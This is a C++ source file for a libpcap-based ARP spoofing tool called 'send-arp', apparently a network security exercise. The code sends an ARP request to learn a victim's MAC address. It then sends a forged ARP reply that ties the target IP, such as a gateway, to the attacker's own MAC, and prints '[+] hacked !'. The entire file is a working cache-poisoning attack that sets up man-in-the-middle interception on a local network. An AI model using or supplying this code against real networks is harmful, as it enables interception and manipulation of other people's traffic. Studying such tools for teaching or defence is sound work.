#include <pcap.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getMyMac(const char* dev) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    close(s);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Ip getMyIp(const char* dev) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ioctl(s, SIOCGIFADDR, &ifr);
    close(s);
    return Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
}

void sendArpPacket(pcap_t* pcap, Mac ethDmac, Mac ethSmac, uint16_t arpOp,
                   Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = ethDmac;
    packet.eth_.smac_ = ethSmac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(arpOp);
    packet.arp_.smac_ = arpSmac;
    packet.arp_.sip_ = htonl(arpSip);
    packet.arp_.tmac_ = arpTmac;
    packet.arp_.tip_ = htonl(arpTip);

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
}

Mac getSenderMac(pcap_t* pcap, Mac myMac, Ip myIp, Ip senderIp) {
    sendArpPacket(pcap, Mac::broadcastMac(), myMac, ArpHdr::Request, myMac, myIp, Mac::nullMac(), senderIp);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply;
        int res = pcap_next_ex(pcap, &header, &reply);
        if (res != 1) continue;

        EthArpPacket* recv = (EthArpPacket*)reply;
        if (recv->eth_.type() != EthHdr::Arp) continue;
        if (recv->arp_.op() != ArpHdr::Reply) continue;
        if (recv->arp_.sip() != senderIp) continue;

        return recv->arp_.smac();
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || ((argc - 2) % 2 != 0)) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    Mac myMac = getMyMac(dev);
    Ip myIp = getMyIp(dev);

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]);
        Ip targetIp(argv[i + 1]);
        Mac senderMac = getSenderMac(pcap, myMac, myIp, senderIp);

		sendArpPacket(pcap, senderMac, myMac, ArpHdr::Reply, myMac, targetIp, senderMac, senderIp);

		puts("[+] hacked !");
    }

    pcap_close(pcap);
    return 0;
}
